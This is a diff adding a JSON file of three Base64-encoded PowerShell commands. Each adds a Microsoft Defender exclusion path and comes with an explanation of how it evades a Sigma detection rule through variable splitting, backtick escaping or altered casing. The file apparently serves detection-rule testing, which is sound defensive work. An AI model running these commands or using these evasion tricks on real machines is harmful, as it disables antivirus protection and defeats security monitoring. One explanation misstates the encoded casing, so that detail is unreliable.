@@ -1,0 +1,14 @@
+[
+  {
+    "output": "powershell.exe -EncodedCommand JABhAD0AJwBTAGUAdAAtAE0AcAAnADsAJABiAD0AJwBQAHIAZQBmAGUAcgBlAG4AYwBlACcAOwBJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiACQAYQAkAGIAIAAtAEUAeABjAGwAdQBzAGkAbwBuAFAAYQB0AGgAIABDADoAXAB0AGUAcwB0ACIA",
+    "explanation": "This payload simulates a bypass by splitting the cmdlet string across multiple variables before Base64 encoding (e.g., $a='Set-Mp'; $b='Preference'). Because the exact contiguous string 'Set-MpPreference ' never exists in the raw text, the 'base64offset' modifier and the hardcoded UTF-16LE checks in the Sigma rule will fail to detect it."
+  },
+  {
+    "output": "powershell.exe -EncodedCommand UwBgAGUAdAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAGEAdABoACAAQwA6AFwAdABlAHMAdAA=",
+    "explanation": "This payload uses PowerShell's backtick escape character within the cmdlet name before encoding (e.g., S`et-MpPreference -ExclusionPath C:\test). PowerShell ignores the backtick during execution, but its presence completely changes the resulting Base64 encoded string, successfully evading the rule's strict static string matching."
+  },
+  {
+    "output": "powershell.exe -EncodedCommand cwBFAHQALQBtAHAAcABSAEUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgAEMAOgBcAHQAZQBzAHQA",
+    "explanation": "This command bypasses the specific UTF-16LE string matches by altering the casing (e.g., sEHt-mppREference). The Sigma rule attempts to catch encoded values by hardcoding specific Title Case and lowercase combinations. Since Base64 output is highly sensitive to case changes, an alternate case combination results in an entirely different Base64 string that is not covered by the rule's 'contains' list."
+  }
+]
